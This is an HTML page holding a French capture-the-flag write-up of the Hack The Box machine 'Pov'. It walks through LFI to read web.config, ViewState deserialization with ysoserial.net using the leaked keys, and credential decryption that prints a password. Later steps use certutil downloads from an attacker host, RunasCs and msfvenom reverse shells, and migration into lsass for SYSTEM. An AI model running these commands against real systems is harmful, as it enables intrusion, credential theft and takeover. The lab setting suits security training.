@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platforme: Hack The Box Lien: Pov Niveau: Moyen OS: Windows Pov débute par un simple site web. Après l&amp;rsquo;énumération, nous découvrons un sous-domaine menant à un site web ASP.NET qui s&amp;rsquo;avère être vulnérable à une faille LFI. En tirant parti de cette vulnérabilité, nous sommes en mesure de lire un fichier critique exposant des informations sensibles que nous utilisons pour exploiter le mécanisme ViewState du site web, ce qui nous donne accès au système cible." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/fr/posts/2024/06/htb-pov/" />
+
+
+    <title>
+        
+            HTB: Pov
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HTB: Pov">
+<meta itemprop="description" content="Platforme: Hack The Box Lien: Pov Niveau: Moyen OS: Windows Pov débute par un simple site web. Après l&rsquo;énumération, nous découvrons un sous-domaine menant à un site web ASP.NET qui s&rsquo;avère être vulnérable à une faille LFI. En tirant parti de cette vulnérabilité, nous sommes en mesure de lire un fichier critique exposant des informations sensibles que nous utilisons pour exploiter le mécanisme ViewState du site web, ce qui nous donne accès au système cible."><meta itemprop="datePublished" content="2024-06-07T12:42:21-05:00" />
+<meta itemprop="dateModified" content="2024-06-07T12:42:21-05:00" />
+<meta itemprop="wordCount" content="908"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Pov/Pov.png" />
+<meta itemprop="keywords" content="Hack The Box," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Pov/Pov.png" /><meta name="twitter:title" content="HTB: Pov"/>
+<meta name="twitter:description" content="Platforme: Hack The Box Lien: Pov Niveau: Moyen OS: Windows Pov débute par un simple site web. Après l&rsquo;énumération, nous découvrons un sous-domaine menant à un site web ASP.NET qui s&rsquo;avère être vulnérable à une faille LFI. En tirant parti de cette vulnérabilité, nous sommes en mesure de lire un fichier critique exposant des informations sensibles que nous utilisons pour exploiter le mécanisme ViewState du site web, ce qui nous donne accès au système cible."/>
+
+
+
+    <meta property="og:title" content="HTB: Pov" />
+<meta property="og:description" content="Platforme: Hack The Box Lien: Pov Niveau: Moyen OS: Windows Pov débute par un simple site web. Après l&rsquo;énumération, nous découvrons un sous-domaine menant à un site web ASP.NET qui s&rsquo;avère être vulnérable à une faille LFI. En tirant parti de cette vulnérabilité, nous sommes en mesure de lire un fichier critique exposant des informations sensibles que nous utilisons pour exploiter le mécanisme ViewState du site web, ce qui nous donne accès au système cible." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/fr/posts/2024/06/htb-pov/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Pov/Pov.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-07T12:42:21-05:00" />
+<meta property="article:modified_time" content="2024-06-07T12:42:21-05:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-06-07 12:42:21 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/fr/about/">À propos</a></li><li><a href="https://scorpiosec.com/fr/posts/">Postes</a></li><li><a href="https://scorpiosec.com/fr/projects/">Projets</a></li><li><a href="https://scorpiosec.com/fr/tags/">Tags</a></li><li><a href="https://scorpiosec.com/fr/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">fr</a>
+                <div class="dropdown-content">
+                    
+                        
+                            <a title="en" href="https://scorpiosec.com/posts/2024/06/htb-pov/">en</a>
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        5 minutes
+
+         | Aussi disponible en
+          
+              <a href="https://scorpiosec.com/posts/2024/06/htb-pov/"><span class="flag fi fi-gb"></span></a>
+          
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/fr/posts/2024/06/htb-pov/">HTB: Pov</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table des matières</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#lateral-movement">Lateral Movement</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platforme: Hack The Box</li>
+<li>Lien: <a href="https://app.hackthebox.com/machines/Pov" target="_blank" >Pov</a>
+
+</li>
+<li>Niveau: Moyen</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>Pov débute par un simple site web. Après l&rsquo;énumération, nous découvrons un sous-domaine menant à un site web ASP.NET qui s&rsquo;avère être vulnérable à une faille LFI. En tirant parti de cette vulnérabilité, nous sommes en mesure de lire un fichier critique exposant des informations sensibles que nous utilisons pour exploiter le mécanisme <code>ViewState</code> du site web, ce qui nous donne accès au système cible. Après exploration du système, nous prenons le contrôle d&rsquo;un autre compte en trouvant ses informations d&rsquo;identification. Enfin, en abusant du privilège <code>SeDebugPrivileg</code> nous accédons à un compte administratif.</p>
+<p><strong>Une machine virtuelle Windows avec Defender désactivé sera nécessaire pour reproduire l&rsquo;une des étapes de l&rsquo;article</strong>.</p>
+<p>IP cible - <code>10.10.11.251</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Pov 10.10.11.251
+</code></pre><p><strong>Résultats</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-23 14:41 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.251
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: pov.htb
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.01 seconds
+</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+<p>Pour faciliter l&rsquo;énumération, nous ajoutons la cible à notre fichier <code>/etc/hosts</code>.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.251 pov.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><p>Le scan ne trouve qu&rsquo;un seul port ouvert (80). En visitant <code>http://10.10.11.251/</code>, nous trouvons un site web statique offrant quelques services de sécurité mais aucune piste d&rsquo;exploitation.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/pov-website.png" alt="Pov website"></p>
+<p>Avec ffuf, nous identifions un sous-domaine.</p>
+<pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://pov.htb -H &#34;Host: FUZZ.pov.htb&#34; -ic -fs 12330
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Pov/subdomain-pov.png" alt="Pov subdomain"></p>
+<p><code>http://dev.pov.htb/</code> mène au portfolio d&rsquo;un développeur web compétent avec JS, ASP.NET, et PHP.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/portfolio-website.png" alt="Pov portfolio website"></p>
+<p>Nous pouvons télécharger son CV à l&rsquo;aide du bouton. Nous observons que le paramètre <code>file</code> est utilisé et qu&rsquo;il fait référence à <code>cv.pdf</code>. Nous pouvons essayer de l&rsquo;utiliser pour un LFI (Local File Inclusion). <em>Pour en savoir plus sur cette vulnérabilité, cliquez <a href="https://www.vaadata.com/blog/fr/exploitation-dune-faille-lfi-local-file-inclusion-et-bonnes-pratiques-securite/" target="_blank" >ici</a>
+
+</em>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/cv-download.png" alt="Pov CV download request"></p>
+<p>Sous Windows, le fichier hosts se trouve à l&rsquo;adresse suivante <code>C:\WINDOWS\system32\drivers\etc\hosts</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/LFI-hosts-file.png" alt="Pov LFI vulnerability"></p>
+<p>Nous arrivons à lire ce fichier! Avec l&rsquo;aide de <code>Wappalyzer</code> nous apprenons que l&rsquo;application est conçue avec ASP.NET et quelques recherches nous apprennent que <code>web.config</code> est le fichier de configuration « utilisé pour gérer les différents paramètres qui définissent un site web » dans les applications ASP.NET. <em>Pour en savoir plus, cliquez <a href="https://www.c-sharpcorner.com/UploadFile/puranindia/Asp-Net-web-configuration-file/" target="_blank" >ici</a>
+
+</em>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/web-framework.png" alt="Pov wappalyzer info"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/web-config.png" alt="ASP.NET Web config file"></p>
+<p>Nous parvenons à lire le fichier de configuration en remplaçant la valeur <code>file</code> par <code>/web.config</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/web-config-file.png" alt="Web config file read"></p>
+<p>En recherchant <code>asp.net machine key exploitation</code> nous trouvons <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter" target="_blank" > cette</a>
+
+ page HackTricks expliquant comment utiliser un outil appelé <a href="https://github.com/pwntester/ysoserial.net" target="_blank" >ysoserial.net</a>
+
+ pour exploiter <code>vIewState</code>.</p>
+<p>Sous <code>Testcase 1.5</code> nous lisons que nous devons fournir deux paramètres <code>--apppath=« / »</code> et <code>--path=« /hello.aspx »</code>.</p>
+<p>Nous avons aussi besoin que notre payload soit encodé en base64, ce que nous obtenons sur <a href="https://www.revshells.com/" target="_blank" >revshells</a>
+
+ en utilisant l&rsquo;option <code>PowerShell #3 (Base64)</code>.</p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p><code>ysoserial</code> est conçu pour Windows. Nous utilisons une VM Windows avec Defender désactivé parce qu&rsquo;il signale l&rsquo;outil comme malveillant. Après exécution de la commande ci-dessous, nous copions son résultat et nous l&rsquo;utilisons pour le paramètre <code>ViewState</code>.</p>
+<p><strong>Command example</strong></p>
+<pre tabindex="0"><code>.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &#34;&lt;INSERT_REVSHELL_HERE&gt;&#34; --path=&#34;/portfolio/default.aspx&#34; --apppath=&#34;/&#34; --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Pov/ViewState-payload.png" alt="ViewState Payload"></p>
+<p>Nous obtenons une connexion sur notre listener après avoir envoyé la requête.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/initial-foothold.png" alt="Initial Foothold"></p>
+<p>Ce compte ne peut pas accéder au fichier <code>user.txt</code> par contre nous trouvons un fichier appelé <code>connection.xml</code> dans <code>C:\Users\sfitz\Documents</code>. Il contient les informations d&rsquo;identification de l&rsquo;utilisateur <code>alaading</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&lt;Objs Version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;Obj RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;TN RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+</span></span><span style="display:flex;"><span>      &lt;T&gt;System.Object&lt;/T&gt;
+</span></span><span style="display:flex;"><span>    &lt;/TN&gt;
+</span></span><span style="display:flex;"><span>    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+</span></span><span style="display:flex;"><span>    &lt;Props&gt;
+</span></span><span style="display:flex;"><span>      &lt;S N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UserName&#34;</span>&gt;alaading&lt;/S&gt;
+</span></span><span style="display:flex;"><span>      &lt;SS N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span>&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;
+</span></span><span style="display:flex;"><span>    &lt;/Props&gt;
+</span></span><span style="display:flex;"><span>  &lt;/Obj&gt;
+</span></span><span style="display:flex;"><span>&lt;/Objs&gt;
+</span></span></code></pre></div><p>Nous avons une valeur de mot de passe mais il ne s&rsquo;agit pas d&rsquo;un hash, cette méthode utilise un module Powershell qui s&rsquo;appuie sur XML sécurisé. <em>Pour en savoir plus <a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx" target="_blank" >ici</a>
+
+</em>.</p>
+<p>Nous révélons le mot de passe avec les commandes ci-dessous.</p>
+<pre tabindex="0"><code>$cred = Import-CliXml C:\Users\sfitz\Documents\connection.xml
+
+$cred.GetNetworkCredential() | fl
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Pov/alaading-creds.png" alt="User alaading user"></p>
+<h3 id="lateral-movement">Lateral Movement</h3>
+<p>Avec les identifiants, nous pouvons maintenant utiliser <a href="https://github.com/antonioCoco/RunasCs" target="_blank" >RunasCs</a>
+
+ pour obtenir un shell en tant qu&rsquo;utilisateur <code>alaading</code>.</p>
+<blockquote>
+<p><code>certutil</code> est utilisé pour télécharger l&rsquo;outil sur la cible.</p>
+</blockquote>
+<pre tabindex="0"><code>certutil -urlcache -f http://&lt;IP_address&gt;:&lt;PORT&gt;/RunasCs.exe runascs.exe
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Pov/dl-runascs.png" alt="runascs download"></p>
+<p>Après avoir exécuté la commande ci-dessous, nous obtenons un shell.</p>
+<pre tabindex="0"><code>.\runascs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r &lt;IP_address&gt;:&lt;PORT&gt;
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Pov/alaading-shell.png" alt="alaading shell"></p>
+<p>Nous trouvons <code>user.txt</code> à l&rsquo;adresse <code>C\Users\alaading\desktop\user.txt</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Nous avons vu que cet utilisateur dispose du privilège <code>SeDebugPrivilege</code>. Selon <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege" target="_blank" >HackTricks</a>
+
+, &ldquo;ce privilège permet de <strong>debugger d&rsquo;autres processus</strong>, y compris de lire et d&rsquo;écrire dans la mémoire. Diverses stratégies d&rsquo;injection de mémoire, capables d&rsquo;échapper à la plupart des antivirus et des solutions de prévention des intrusions, peuvent être employées avec ce privilège&rdquo;.</p>
+<p>Nous commençons par générer un payload avec msfvenom.</p>
+<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP_address lport=PORT -f exe -a x64 --platform windows -o revshell.exe
+</code></pre><p>Puis nous téléchargeons le fichier sur la cible.</p>
+<pre tabindex="0"><code>certutil -urlcache -f http://&lt;IP_address&gt;:&lt;PORT&gt;/revshell.exe revshell.exe
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Pov/revshell.png" alt="reverse shell file"></p>
+<p>Ensuite, dans Metasploit, nous lançons le <code>mutli/handler</code>, exécutons le fichier <code>revshell.exe</code> sur la cible et nous obtenons une session meterpreter.</p>
+<pre tabindex="0"><code>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost &lt;IP_address&gt;
+set lport &lt;PORT&gt;
+run
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Pov/meterpreter-session.png" alt="meterpreter session"></p>
+<p>Avec la commande <code>ps</code> nous examinons les processus sur la cible et nous remarquons <code>lsass.exe</code>. Puisque nous avons le privilège <code>SeDebugPrivilege</code>, nous pouvons migrer vers ce processus.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/lsass-process.png" alt="lsass process"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/process-migration.png" alt="process migration"></p>
+<p>Nous utilisons <code>shell</code> pour lancer un shell <code>cmd</code>, nous sommes maintenant <code>nt authoritysystem</code> et <code>root.txt</code> se trouve à <code>C:\NUsers\Administrator\NDesktop\Nroot.txt</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Pov/root-flag.png" alt="Root flag"></p>
+<p>Une VM Windows est parfois nécessaire pour exécuter certains outils pour les tests de pénétration, je recommande fortement <a href="https://github.com/mandiant/commando-vm" target="_blank" >CommandoVM</a>
+
+ car il contient de nombreux outils qui ne sont pas inclus dans Kali Linux. Vous pouvez suivre <a href="https://www.youtube.com/watch?v=nNMEhm8pvPM&amp;ab_channel=Lsecqt" target="_blank" >cette vidéo</a>
+
+ pour un tutoriel d&rsquo;installation. J&rsquo;espère que cet article vous a été utile!</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/tags/hack-the-box/">Hack The Box</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        908 Mots
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-06-07 12:42
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Pov&amp;caption=HTB%3a%20Pov&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Pov&amp;body=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f&amp;media=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f06%2fhtb-pov%2f;description=HTB%3a%20Pov" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
